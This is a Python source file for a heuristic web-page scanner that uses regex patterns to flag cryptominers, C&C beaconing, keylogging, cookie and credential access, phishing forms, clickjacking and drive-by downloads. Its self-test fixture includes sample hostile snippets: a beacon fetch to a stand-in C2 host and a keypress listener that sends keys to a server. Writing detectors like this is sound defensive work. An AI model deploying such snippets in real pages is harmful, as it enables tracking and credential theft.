"""
LAYER F: BEHAVIORAL HEURISTICS
Passive behavioral analysis without sandboxing
"""

import re
from typing import Dict, List
from urllib.parse import urlparse

class BehavioralAnalyzer:
    """
    Detect malicious behavior through passive analysis
    No sandboxing required - analyzes patterns and indicators
    """
    
    def __init__(self):
        self.findings = []
        self.heuristic_score = 0.0
        self.behaviors_detected = []
    
    def analyze(self, url: str, page_data: dict = None) -> dict:
        """
        Perform behavioral heuristic analysis
        
        Args:
            url: URL being analyzed
            page_data: Page content data
        
        Returns:
            dict: Behavioral findings and heuristic score
        """
        self.findings = []
        self.heuristic_score = 0.0
        self.behaviors_detected = []
        
        if not page_data:
            return {
                'heuristic_score': 0,
                'findings': ['No page data for behavioral analysis'],
                'behaviors': [],
                'status': 'skipped'
            }
        
        try:
            html = page_data.get('html', '')
            scripts = page_data.get('scripts', [])
            
            # Run all behavioral checks
            self._detect_cryptomining(scripts)
            self._detect_malicious_libraries(scripts)
            self._detect_beaconing(scripts)
            self._detect_async_network_calls(scripts)
            self._detect_hidden_iframes(html)
            self._detect_trackers(html, scripts)
            self._detect_phishing_ui(html)
            self._detect_fake_login_forms(html)
            self._detect_data_exfiltration(scripts)
            self._detect_keylogging(scripts)
            self._detect_clickjacking(html)
            self._detect_drive_by_download(html, scripts)
            
            # Normalize score
            self.heuristic_score = min(100, max(0, self.heuristic_score))
            
            return {
                'heuristic_score': round(self.heuristic_score, 2),
                'findings': self.findings,
                'behaviors': self.behaviors_detected,
                'status': 'completed',
                'checks_performed': 12
            }
            
        except Exception as e:
            return {
                'heuristic_score': 0,
                'findings': [f"Behavioral analysis error: {str(e)}"],
                'behaviors': [],
                'status': 'error'
            }
    
    def _detect_cryptomining(self, scripts: List[Dict]):
        """Detect cryptomining scripts"""
        mining_indicators = [
            ('coinhive', 'Coinhive Miner'),
            ('coin-hive', 'Coinhive Variant'),
            ('crypto-loot', 'CryptoLoot Miner'),
            ('jsecoin', 'JSECoin Miner'),
            ('cryptonight', 'CryptoNight Algorithm'),
            ('stratum+tcp', 'Mining Pool Connection'),
            ('WebAssembly.*mining', 'WebAssembly Miner'),
            ('worker.*hash', 'Worker-based Mining'),
            ('xmr-stak', 'Monero Mining'),
            ('cn/r|cn/half', 'RandomX Mining')
        ]
        
        for script in scripts:
            content = script.get('content', '').lower()
            src = script.get('src', '').lower()
            
            for pattern, name in mining_indicators:
                if re.search(pattern, content) or re.search(pattern, src):
                    self.behaviors_detected.append(name)
                    self.findings.append(f"🚨 Cryptominer detected: {name}")
                    self.heuristic_score += 30
                    return  # One detection is enough
    
    def _detect_malicious_libraries(self, scripts: List[Dict]):
        """Detect known malicious JavaScript libraries"""
        malicious_libs = [
            ('malware.js', 'Generic Malware Library'),
            ('exploit.js', 'Exploit Library'),
            ('keylog', 'Keylogger Library'),
            ('trojan.js', 'Trojan Library'),
            ('backdoor.js', 'Backdoor Script'),
            ('rat.js', 'Remote Access Trojan'),
            ('botnet.js', 'Botnet Script')
        ]
        
        for script in scripts:
            src = script.get('src', '').lower()
            
            for pattern, name in malicious_libs:
                if pattern in src:
                    self.behaviors_detected.append(name)
                    self.findings.append(f"🚨 Malicious library detected: {name}")
                    self.heuristic_score += 35
    
    def _detect_beaconing(self, scripts: List[Dict]):
        """Detect background beaconing to C&C servers"""
        beacon_patterns = [
            r'setInterval\s*\([^)]*fetch\s*\(',
            r'setInterval\s*\([^)]*XMLHttpRequest',
            r'setInterval\s*\([^)]*\.send\s*\(',
            r'WebSocket\s*\([^)]*wss?://'
        ]
        
        for script in scripts:
            content = script.get('content', '')
            
            for pattern in beacon_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    self.behaviors_detected.append('Background Beaconing')
                    self.findings.append("⚠️ Periodic network requests detected - possible C&C communication")
                    self.heuristic_score += 20
                    return
    
    def _detect_async_network_calls(self, scripts: List[Dict]):
        """Detect suspicious async network requests"""
        all_content = ' '.join(s.get('content', '') for s in scripts)
        
        # Count network request functions
        fetch_count = len(re.findall(r'\bfetch\s*\(', all_content))
        xhr_count = len(re.findall(r'XMLHttpRequest', all_content))
        websocket_count = len(re.findall(r'WebSocket', all_content))
        
        total_requests = fetch_count + xhr_count + websocket_count
        
        if total_requests > 10:
            self.behaviors_detected.append('Excessive Network Requests')
            self.findings.append(f"⚠️ Excessive network calls ({total_requests}) - data exfiltration risk")
            self.heuristic_score += 15
        
        # Check for requests to suspicious domains
        suspicious_domains = re.findall(
            r'(fetch|XMLHttpRequest|WebSocket)\s*\([^)]*["\'](https?://[^"\']+)',
            all_content
        )
        
        if suspicious_domains:
            external_count = len(suspicious_domains)
            if external_count > 5:
                self.behaviors_detected.append('External Data Transfer')
                self.findings.append(f"⚠️ Multiple external requests ({external_count})")
                self.heuristic_score += 12
    
    def _detect_hidden_iframes(self, html: str):
        """Detect hidden iframes (common in malware)"""
        # Patterns for hidden iframes
        hidden_iframe_patterns = [
            r'<iframe[^>]*display:\s*none',
            r'<iframe[^>]*visibility:\s*hidden',
            r'<iframe[^>]*width:\s*0',
            r'<iframe[^>]*height:\s*0',
            r'<iframe[^>]*opacity:\s*0'
        ]
        
        hidden_count = 0
        for pattern in hidden_iframe_patterns:
            hidden_count += len(re.findall(pattern, html, re.IGNORECASE))
        
        if hidden_count > 0:
            self.behaviors_detected.append('Hidden iframes')
            self.findings.append(f"⚠️ Hidden iframes detected ({hidden_count}) - possible exploit delivery")
            self.heuristic_score += 18
    
    def _detect_trackers(self, html: str, scripts: List[Dict]):
        """Detect tracking scripts and pixels"""
        # Known tracking domains
        tracker_domains = [
            'google-analytics.com',
            'facebook.com/tr',
            'doubleclick.net',
            'scorecardresearch.com',
            'quantserve.com',
            'tracking-',
            'analytics-',
            'telemetry.'
        ]
        
        tracker_count = 0
        all_sources = re.findall(r'src=["\']([^"\']+)', html)
        all_sources += [s.get('src', '') for s in scripts if s.get('src')]
        
        for src in all_sources:
            if any(tracker in src.lower() for tracker in tracker_domains):
                tracker_count += 1
        
        # Tracking pixels
        pixel_count = len(re.findall(r'<img[^>]*1x1[^>]*>', html, re.IGNORECASE))
        pixel_count += len(re.findall(r'<img[^>]*width=["\']1["\'][^>]*height=["\']1["\']', html, re.IGNORECASE))
        
        if tracker_count > 5:
            self.behaviors_detected.append('Excessive Tracking')
            self.findings.append(f"ℹ️ Multiple tracking scripts ({tracker_count}) - privacy concern")
            self.heuristic_score += 8
        
        if pixel_count > 3:
            self.findings.append(f"ℹ️ Tracking pixels detected ({pixel_count})")
            self.heuristic_score += 5
    
    def _detect_phishing_ui(self, html: str):
        """Detect phishing UI patterns"""
        phishing_patterns = [
            # Fake security warnings
            (r'account.*suspended', 'Account Suspended Warning'),
            (r'verify.*identity', 'Identity Verification Request'),
            (r'unusual.*activity', 'Unusual Activity Alert'),
            (r'confirm.*information', 'Information Confirmation Request'),
            (r'urgent.*action', 'Urgent Action Required'),
            (r'limited.*time', 'Limited Time Offer'),
            
            # Fake security badges
            (r'<img[^>]*(verified|secure|ssl|certificate)[^>]*>', 'Fake Security Badge'),
            
            # Urgency triggers
            (r'act.*immediately|act.*now', 'Urgency Trigger'),
            (r'within.*24.*hours', 'Time Pressure Tactic')
        ]
        
        html_lower = html.lower()
        detected_patterns = []
        
        for pattern, name in phishing_patterns:
            if re.search(pattern, html_lower):
                detected_patterns.append(name)
        
        if detected_patterns:
            self.behaviors_detected.extend(detected_patterns[:3])  # Top 3
            self.findings.append(f"⚠️ Phishing UI patterns: {', '.join(detected_patterns[:3])}")
            self.heuristic_score += min(20, len(detected_patterns) * 5)
    
    def _detect_fake_login_forms(self, html: str):
        """Detect fake login forms mimicking legitimate sites"""
        # Check for password inputs
        password_inputs = len(re.findall(r'type=["\']password["\']', html, re.IGNORECASE))
        
        if password_inputs == 0:
            return
        
        # Check for brand names in form
        brands = ['paypal', 'amazon', 'google', 'microsoft', 'apple', 'facebook', 'bank']
        html_lower = html.lower()
        
        found_brands = [brand for brand in brands if brand in html_lower]
        
        if found_brands:
            # Check if form submits to external domain
            external_form = re.search(
                r'<form[^>]*action=["\']https?://(?!' + '|'.join(found_brands) + r')[^"\']+',
                html_lower
            )
            
            if external_form:
                self.behaviors_detected.append('Fake Login Form')
                self.findings.append(f"🚨 Fake login form detected (mimics: {', '.join(found_brands)})")
                self.heuristic_score += 25
    
    def _detect_data_exfiltration(self, scripts: List[Dict]):
        """Detect data exfiltration patterns"""
        exfil_patterns = [
            r'document\.cookie',
            r'localStorage\.getItem',
            r'sessionStorage\.getItem',
            r'navigator\.credentials',
            r'FormData.*password'
        ]
        
        exfil_count = 0
        for script in scripts:
            content = script.get('content', '')
            for pattern in exfil_patterns:
                exfil_count += len(re.findall(pattern, content, re.IGNORECASE))
        
        if exfil_count > 3:
            self.behaviors_detected.append('Data Exfiltration')
            self.findings.append(f"⚠️ Data access patterns detected ({exfil_count}) - credential theft risk")
            self.heuristic_score += 18
    
    def _detect_keylogging(self, scripts: List[Dict]):
        """Detect keylogging behavior"""
        keylog_patterns = [
            r'addEventListener\s*\(\s*["\']keypress',
            r'addEventListener\s*\(\s*["\']keydown',
            r'addEventListener\s*\(\s*["\']keyup',
            r'onkeypress\s*=',
            r'onkeydown\s*='
        ]
        
        all_content = ' '.join(s.get('content', '') for s in scripts)
        
        keylog_count = 0
        for pattern in keylog_patterns:
            keylog_count += len(re.findall(pattern, all_content, re.IGNORECASE))
        
        if keylog_count > 5:
            self.behaviors_detected.append('Keylogging')
            self.findings.append(f"🚨 Keylogger detected ({keylog_count} event listeners)")
            self.heuristic_score += 25
    
    def _detect_clickjacking(self, html: str):
        """Detect clickjacking attempts"""
        clickjack_indicators = [
            r'<iframe[^>]*z-index:\s*-?\d+',
            r'<iframe[^>]*position:\s*absolute',
            r'<iframe[^>]*opacity:\s*0',
            r'pointer-events:\s*none'
        ]
        
        clickjack_count = 0
        for pattern in clickjack_indicators:
            clickjack_count += len(re.findall(pattern, html, re.IGNORECASE))
        
        if clickjack_count > 2:
            self.behaviors_detected.append('Clickjacking')
            self.findings.append("⚠️ Clickjacking indicators detected")
            self.heuristic_score += 15
    
    def _detect_drive_by_download(self, html: str, scripts: List[Dict]):
        """Detect drive-by download attempts"""
        download_patterns = [
            r'<a[^>]*download[^>]*>',
            r'location\.href\s*=.*\.exe["\']',
            r'location\.href\s*=.*\.zip["\']',
            r'window\.open\(.*\.exe',
            r'createElement\(["\']a["\'].*download'
        ]
        
        all_content = html + ' '.join(s.get('content', '') for s in scripts)
        
        for pattern in download_patterns:
            if re.search(pattern, all_content, re.IGNORECASE):
                self.behaviors_detected.append('Drive-by Download')
                self.findings.append("🚨 Automatic download detected - malware delivery risk")
                self.heuristic_score += 28
                return


# Quick test
if __name__ == "__main__":
    analyzer = BehavioralAnalyzer()
    
    test_data = {
        'html': '''
            <iframe style="display:none" src="http://evil.com"></iframe>
            <form action="https://phishing.com">
                <input type="password" name="password">
            </form>
            <p>Your account has been suspended! Verify immediately!</p>
        ''',
        'scripts': [
            {'content': 'setInterval(function(){ fetch("http://c2server.com/beacon"); }, 5000);'},
            {'content': 'document.addEventListener("keypress", function(e){ sendToServer(e.key); });'}
        ]
    }
    
    result = analyzer.analyze("https://phishing-site.com", test_data)
    print(f"Heuristic Score: {result['heuristic_score']}/100")
    print(f"Behaviors Detected: {len(result['behaviors'])}")
    print("\nFindings:")
    for finding in result['findings']:
        print(f"  {finding}")
